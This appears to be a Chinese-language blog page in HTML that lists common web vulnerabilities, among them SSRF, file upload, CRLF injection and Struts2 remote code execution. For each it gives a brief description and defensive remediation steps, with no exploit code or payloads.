+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="SSRF漏洞描述"><a href="#SSRF漏洞描述" class="headerlink" title="SSRF漏洞描述"></a>SSRF漏洞描述</h3><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>
+<p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>
+<p>　　(5)、利用File协议读取本地文件。</p>
+<h3 id="SSRF漏洞修复建议"><a href="#SSRF漏洞修复建议" class="headerlink" title="SSRF漏洞修复建议"></a>SSRF漏洞修复建议</h3><p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</p>
+<p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p>
+<p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>　　4、验证请求的文件格式</p>
+<p>　　5、禁止跳转</p>
+<p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p>
+<p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<h2 id="任意命令-代码执行"><a href="#任意命令-代码执行" class="headerlink" title="任意命令&#x2F;代码执行"></a>任意命令&#x2F;代码执行</h2><h3 id="任意命令-代码执行漏洞描述"><a href="#任意命令-代码执行漏洞描述" class="headerlink" title="任意命令&#x2F;代码执行漏洞描述"></a>任意命令&#x2F;代码执行漏洞描述</h3><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p>
+<h3 id="任意命令-代码执行漏洞修复建议"><a href="#任意命令-代码执行漏洞修复建议" class="headerlink" title="任意命令&#x2F;代码执行漏洞修复建议"></a>任意命令&#x2F;代码执行漏洞修复建议</h3><p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p>
+<p>　　2、减少或不使用代码或命令执行函数</p>
+<p>　　3、客户端提交的变量在放入函数前进行检测</p>
+<p>　　4、减少或不使用危险函数</p>
+<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><h3 id="任意文件上传漏洞描述"><a href="#任意文件上传漏洞描述" class="headerlink" title="任意文件上传漏洞描述"></a>任意文件上传漏洞描述</h3><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p>
+<h3 id="任意文件上传修复建议"><a href="#任意文件上传修复建议" class="headerlink" title="任意文件上传修复建议"></a>任意文件上传修复建议</h3><p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p>
+<p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p>
+<p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p>
+<p>　　4、严格限制上传的文件路径。</p>
+<p>　　5、文件扩展名服务端白名单校验。</p>
+<p>　　6、文件内容服务端校验。</p>
+<p>　　7、上传文件重命名。</p>
+<p>　　8、隐藏上传文件路径。</p>
+<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h3 id="目录遍历漏洞描述"><a href="#目录遍历漏洞描述" class="headerlink" title="目录遍历漏洞描述"></a>目录遍历漏洞描述</h3><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符..&#x2F;跳出程序本身的限制目录，来下载或显示任意文件。</p>
+<h3 id="目录遍历漏洞修复建议"><a href="#目录遍历漏洞修复建议" class="headerlink" title="目录遍历漏洞修复建议"></a>目录遍历漏洞修复建议</h3><p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符..&#x2F;。</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="文件包含漏洞描述"><a href="#文件包含漏洞描述" class="headerlink" title="文件包含漏洞描述"></a>文件包含漏洞描述</h3><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p>
+<h3 id="文件包含漏洞修复建议"><a href="#文件包含漏洞修复建议" class="headerlink" title="文件包含漏洞修复建议"></a>文件包含漏洞修复建议</h3><p>　　1、严格检查变量是否已经初始化。</p>
+<p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现.&#x2F;和..&#x2F;等目录跳转符。</p>
+<p>　　3、严格检查文件包含函数中的参数是否外界可控。</p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="弱口令漏洞描述"><a href="#弱口令漏洞描述" class="headerlink" title="弱口令漏洞描述"></a>弱口令漏洞描述</h3><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p>
+<p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p>
+<h3 id="弱口令漏洞修复建议"><a href="#弱口令漏洞修复建议" class="headerlink" title="弱口令漏洞修复建议"></a>弱口令漏洞修复建议</h3><p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p>
+<p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p>
+<p>　　3、增加人机验证机制，限制ip访问次数。</p>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="暴力破解漏洞描述"><a href="#暴力破解漏洞描述" class="headerlink" title="暴力破解漏洞描述"></a>暴力破解漏洞描述</h3><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p>
+<h3 id="暴力破解漏洞修复建议"><a href="#暴力破解漏洞修复建议" class="headerlink" title="暴力破解漏洞修复建议"></a>暴力破解漏洞修复建议</h3><p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p>
+<p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p>
+<p>　　3、增加人机验证机制</p>
+<p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p>
+<h2 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h2><h3 id="越权访问漏洞描述"><a href="#越权访问漏洞描述" class="headerlink" title="越权访问漏洞描述"></a>越权访问漏洞描述</h3><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p>
+<h3 id="越权访问漏洞修复建议"><a href="#越权访问漏洞修复建议" class="headerlink" title="越权访问漏洞修复建议"></a>越权访问漏洞修复建议</h3><p>　　1、对用户访问角色的权限进行严格的检查及限制。</p>
+<p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制</p>
+<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><h3 id="未授权访问漏洞描述"><a href="#未授权访问漏洞描述" class="headerlink" title="未授权访问漏洞描述"></a>未授权访问漏洞描述</h3><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p>
+<h3 id="未授权访问漏洞修复建议"><a href="#未授权访问漏洞修复建议" class="headerlink" title="未授权访问漏洞修复建议"></a>未授权访问漏洞修复建议</h3><p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p>
+<p>　　2、可以使用session对用户的身份进行判断和控制。</p>
+<h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><h3 id="列目录漏洞描述"><a href="#列目录漏洞描述" class="headerlink" title="列目录漏洞描述"></a>列目录漏洞描述</h3><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p>
+<h3 id="列目录漏洞修复建议"><a href="#列目录漏洞修复建议" class="headerlink" title="列目录漏洞修复建议"></a>列目录漏洞修复建议</h3><p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p>
+<p>　　2、设置目录访问权限</p>
+<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="PHP反序列化漏洞描述"><a href="#PHP反序列化漏洞描述" class="headerlink" title="PHP反序列化漏洞描述"></a>PHP反序列化漏洞描述</h3><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p>
+<p>　　可参考：<a class="link"   href="https://www.freebuf.com/articles/web/167721.html" >https://www.freebuf.com/articles/web/167721.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="PHP反序列化漏洞修复建议"><a href="#PHP反序列化漏洞修复建议" class="headerlink" title="PHP反序列化漏洞修复建议"></a>PHP反序列化漏洞修复建议</h3><p>　　1、对传入的对象进行严格的过滤检查</p>
+<p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p>
+<h2 id="http-slow拒绝服务攻击"><a href="#http-slow拒绝服务攻击" class="headerlink" title="http slow拒绝服务攻击"></a>http slow拒绝服务攻击</h2><h3 id="拒绝服务攻击漏洞描述"><a href="#拒绝服务攻击漏洞描述" class="headerlink" title="拒绝服务攻击漏洞描述"></a>拒绝服务攻击漏洞描述</h3><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p>
+<h3 id="拒绝服务攻击漏洞修复建议"><a href="#拒绝服务攻击漏洞修复建议" class="headerlink" title="拒绝服务攻击漏洞修复建议"></a>拒绝服务攻击漏洞修复建议</h3><p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p>
+<p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p>
+<p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p>
+<p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</p>
+<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><h3 id="CRLF注入漏洞描述"><a href="#CRLF注入漏洞描述" class="headerlink" title="CRLF注入漏洞描述"></a>CRLF注入漏洞描述</h3><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p>
+<h3 id="CRLF注入漏洞修复建议"><a href="#CRLF注入漏洞修复建议" class="headerlink" title="CRLF注入漏洞修复建议"></a>CRLF注入漏洞修复建议</h3><p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p>
+<h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><h3 id="LDAP注入漏洞描述"><a href="#LDAP注入漏洞描述" class="headerlink" title="LDAP注入漏洞描述"></a>LDAP注入漏洞描述</h3><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p>
+<h3 id="LDAP注入漏洞修复建议"><a href="#LDAP注入漏洞修复建议" class="headerlink" title="LDAP注入漏洞修复建议"></a>LDAP注入漏洞修复建议</h3><p>　　对用户的输入内容进行严格的过滤。</p>
+<h2 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h2><h3 id="URL跳转漏洞描述"><a href="#URL跳转漏洞描述" class="headerlink" title="URL跳转漏洞描述"></a>URL跳转漏洞描述</h3><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p>
+<h3 id="URL跳转漏洞修复建议"><a href="#URL跳转漏洞修复建议" class="headerlink" title="URL跳转漏洞修复建议"></a>URL跳转漏洞修复建议</h3><p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p>
+<p>　　2、白名单规定跳转链接</p>
+<h2 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h2><h3 id="明文传输漏洞描述"><a href="#明文传输漏洞描述" class="headerlink" title="明文传输漏洞描述"></a>明文传输漏洞描述</h3><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p>
+<h3 id="明文传输漏洞修复建议"><a href="#明文传输漏洞修复建议" class="headerlink" title="明文传输漏洞修复建议"></a>明文传输漏洞修复建议</h3><p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p>
+<p>　　2、使用https来保证传输的安全。</p>
+<h2 id="网页木马"><a href="#网页木马" class="headerlink" title="网页木马"></a>网页木马</h2><h3 id="网页木马漏洞描述"><a href="#网页木马漏洞描述" class="headerlink" title="网页木马漏洞描述"></a>网页木马漏洞描述</h3><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p>
+<h3 id="网页木马漏洞修复建议"><a href="#网页木马漏洞修复建议" class="headerlink" title="网页木马漏洞修复建议"></a>网页木马漏洞修复建议</h3><p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p>
+<p>　　2、发现并及时修复已存在的漏洞。</p>
+<p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p>
+<h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><h3 id="备份文件泄露漏洞描述"><a href="#备份文件泄露漏洞描述" class="headerlink" title="备份文件泄露漏洞描述"></a>备份文件泄露漏洞描述</h3><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p>
+<h3 id="备份文件泄露漏洞修复建议"><a href="#备份文件泄露漏洞修复建议" class="headerlink" title="备份文件泄露漏洞修复建议"></a>备份文件泄露漏洞修复建议</h3><p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p>
+<p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="敏感信息泄露漏洞描述"><a href="#敏感信息泄露漏洞描述" class="headerlink" title="敏感信息泄露漏洞描述"></a>敏感信息泄露漏洞描述</h3><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p>
+<h3 id="敏感信息泄露漏洞修复建议"><a href="#敏感信息泄露漏洞修复建议" class="headerlink" title="敏感信息泄露漏洞修复建议"></a>敏感信息泄露漏洞修复建议</h3><p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p>
+<p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p>
+<p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p>
+<p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p>
+<h2 id="短信-邮件轰炸"><a href="#短信-邮件轰炸" class="headerlink" title="短信&#x2F;邮件轰炸"></a>短信&#x2F;邮件轰炸</h2><h3 id="邮件轰炸漏洞描述"><a href="#邮件轰炸漏洞描述" class="headerlink" title="邮件轰炸漏洞描述"></a>邮件轰炸漏洞描述</h3><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p>
+<h3 id="邮件轰炸漏洞修复建议"><a href="#邮件轰炸漏洞修复建议" class="headerlink" title="邮件轰炸漏洞修复建议"></a>邮件轰炸漏洞修复建议</h3><p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p>
+<h2 id="phpinfo信息泄露"><a href="#phpinfo信息泄露" class="headerlink" title="phpinfo信息泄露"></a>phpinfo信息泄露</h2><h3 id="phpinfo信息泄露漏洞描述"><a href="#phpinfo信息泄露漏洞描述" class="headerlink" title="phpinfo信息泄露漏洞描述"></a>phpinfo信息泄露漏洞描述</h3><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p>
+<h3 id="phpinfo信息泄露漏洞修复建议"><a href="#phpinfo信息泄露漏洞修复建议" class="headerlink" title="phpinfo信息泄露漏洞修复建议"></a>phpinfo信息泄露漏洞修复建议</h3><p>　　1、删除phpinfo 函数。</p>
+<p>　　2、若文件无用可直接删除。</p>
+<h2 id="IIS短文件名泄露"><a href="#IIS短文件名泄露" class="headerlink" title="IIS短文件名泄露"></a>IIS短文件名泄露</h2><h3 id="IIS短文件名泄露漏洞描述"><a href="#IIS短文件名泄露漏洞描述" class="headerlink" title="IIS短文件名泄露漏洞描述"></a>IIS短文件名泄露漏洞描述</h3><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p>
+<p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p>
+<h3 id="IIS短文件名泄露漏洞修复建议"><a href="#IIS短文件名泄露漏洞修复建议" class="headerlink" title="IIS短文件名泄露漏洞修复建议"></a>IIS短文件名泄露漏洞修复建议</h3><p>　　修改Windows配置，关闭短文件名功能。</p>
+<p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p>
+<p>　　2.如果是虚拟主机空间用户,可采用以下修复方案：</p>
+<p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p>
+<p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p>
+<p>　　3）升级net framework 至4.0以上版本。</p>
+<p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a class="link"   href="http://www.back,然后删除原文件夹d/www%EF%BC%8C%E5%86%8D%E9%87%8D%E5%91%BD%E5%90%8DD:/www.back%E5%88%B0D:/www%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E9%87%8D%E6%96%B0%E5%A4%8D%E5%88%B6%EF%BC%8C%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%88%99%E6%98%AF%E4%B8%8D%E4%BC%9A%E6%B6%88%E5%A4%B1%E7%9A%84%E3%80%82" >www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="应用程序错误信息泄露"><a href="#应用程序错误信息泄露" class="headerlink" title="应用程序错误信息泄露"></a>应用程序错误信息泄露</h2><h3 id="应用程序错误信息泄露漏洞描述"><a href="#应用程序错误信息泄露漏洞描述" class="headerlink" title="应用程序错误信息泄露漏洞描述"></a>应用程序错误信息泄露漏洞描述</h3><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p>
+<h3 id="应用程序错误信息泄露漏洞修复建议"><a href="#应用程序错误信息泄露漏洞修复建议" class="headerlink" title="应用程序错误信息泄露漏洞修复建议"></a>应用程序错误信息泄露漏洞修复建议</h3><p>　　1、自定义错误页面或使用统一的错误页面提示。</p>
+<h2 id="ApacheTomcat默认文件"><a href="#ApacheTomcat默认文件" class="headerlink" title="ApacheTomcat默认文件"></a>ApacheTomcat默认文件</h2><h3 id="ApacheTomcat默认文件漏洞描述"><a href="#ApacheTomcat默认文件漏洞描述" class="headerlink" title="ApacheTomcat默认文件漏洞描述"></a>ApacheTomcat默认文件漏洞描述</h3><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p>
+<h3 id="ApacheTomcat默认文件漏洞修复建议"><a href="#ApacheTomcat默认文件漏洞修复建议" class="headerlink" title="ApacheTomcat默认文件漏洞修复建议"></a>ApacheTomcat默认文件漏洞修复建议</h3><p>　　1、删除样例文件</p>
+<p>　　2、限制文件访问权限</p>
+<h2 id="Crossdomain-xml配置不当"><a href="#Crossdomain-xml配置不当" class="headerlink" title="Crossdomain.xml配置不当"></a>Crossdomain.xml配置不当</h2><h3 id="Crossdomain-xml配置不当漏洞描述"><a href="#Crossdomain-xml配置不当漏洞描述" class="headerlink" title="Crossdomain.xml配置不当漏洞描述"></a>Crossdomain.xml配置不当漏洞描述</h3><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p>
+<h3 id="Crossdomain-xml配置不当漏洞修复建议"><a href="#Crossdomain-xml配置不当漏洞修复建议" class="headerlink" title="Crossdomain.xml配置不当漏洞修复建议"></a>Crossdomain.xml配置不当漏洞修复建议</h3><p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p>
+<h2 id="目标服务器启用了不安全HTTP方法"><a href="#目标服务器启用了不安全HTTP方法" class="headerlink" title="目标服务器启用了不安全HTTP方法"></a>目标服务器启用了不安全HTTP方法</h2><h3 id="目标服务器启用了不安全HTTP方法漏洞描述"><a href="#目标服务器启用了不安全HTTP方法漏洞描述" class="headerlink" title="目标服务器启用了不安全HTTP方法漏洞描述"></a>目标服务器启用了不安全HTTP方法漏洞描述</h3><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p>
+<h3 id="目标服务器启用了不安全HTTP方法漏洞修复建议"><a href="#目标服务器启用了不安全HTTP方法漏洞修复建议" class="headerlink" title="目标服务器启用了不安全HTTP方法漏洞修复建议"></a>目标服务器启用了不安全HTTP方法漏洞修复建议</h3><p>　　1、关闭不安全的传输方法，只开启POST、GET方法。</p>
+<p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p>
+<h2 id="Weblogic-SSRF服务器请求伪造"><a href="#Weblogic-SSRF服务器请求伪造" class="headerlink" title="Weblogic SSRF服务器请求伪造"></a>Weblogic SSRF服务器请求伪造</h2><h3 id="Weblogic-SSRF服务器请求伪造漏洞描述"><a href="#Weblogic-SSRF服务器请求伪造漏洞描述" class="headerlink" title="Weblogic SSRF服务器请求伪造漏洞描述"></a>Weblogic SSRF服务器请求伪造漏洞描述</h3><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p>
+<h3 id="Weblogic-SSRF服务器请求伪造漏洞修复建议"><a href="#Weblogic-SSRF服务器请求伪造漏洞修复建议" class="headerlink" title="Weblogic SSRF服务器请求伪造漏洞修复建议"></a>Weblogic SSRF服务器请求伪造漏洞修复建议</h3><p>　　1、若不影响业务则可删除uddiexplorer文件夹</p>
+<p>　　2、限制uddiexplorer应用只能内网访问</p>
+<h2 id="Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-019）"></a>Apache Struts2 远程代码执行漏洞（S2-019）</h2><h3 id="S2-019漏洞描述"><a href="#S2-019漏洞描述" class="headerlink" title="S2-019漏洞描述"></a>S2-019漏洞描述</h3><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
+<h3 id="S2-019漏洞修复建议"><a href="#S2-019漏洞修复建议" class="headerlink" title="S2-019漏洞修复建议"></a>S2-019漏洞修复建议</h3><p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p>
+<p>　　2、或者手工设置struts.xml文件&lt;constantname&#x3D;”struts.enable.DynamicMethodInvocation”value&#x3D;”false”&#x2F;&gt;</p>
+<h2 id="Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-037）"></a>Apache Struts2 远程代码执行漏洞（S2-037）</h2><h3 id="S2-037漏洞描述"><a href="#S2-037漏洞描述" class="headerlink" title="S2-037漏洞描述"></a>S2-037漏洞描述</h3><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p>
+<h3 id="S2-037漏洞修复建议"><a href="#S2-037漏洞修复建议" class="headerlink" title="S2-037漏洞修复建议"></a>S2-037漏洞修复建议</h3><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
+<h2 id="Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="Apache Struts2 DevMode 远程代码执行漏洞"></a>Apache Struts2 DevMode 远程代码执行漏洞</h2><h3 id="Apache-Struts2-DevMode-远程代码执行漏洞描述"><a href="#Apache-Struts2-DevMode-远程代码执行漏洞描述" class="headerlink" title="Apache Struts2 DevMode 远程代码执行漏洞描述"></a>Apache Struts2 DevMode 远程代码执行漏洞描述</h3><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
+<h3 id="Apache-Struts2-DevMode-远程代码执行漏洞修复建议"><a href="#Apache-Struts2-DevMode-远程代码执行漏洞修复建议" class="headerlink" title="Apache Struts2 DevMode 远程代码执行漏洞修复建议"></a>Apache Struts2 DevMode 远程代码执行漏洞修复建议</h3><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
+<p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name&#x3D;”struts.devMode”value&#x3D;”false”&#x2F;&gt;。</p>
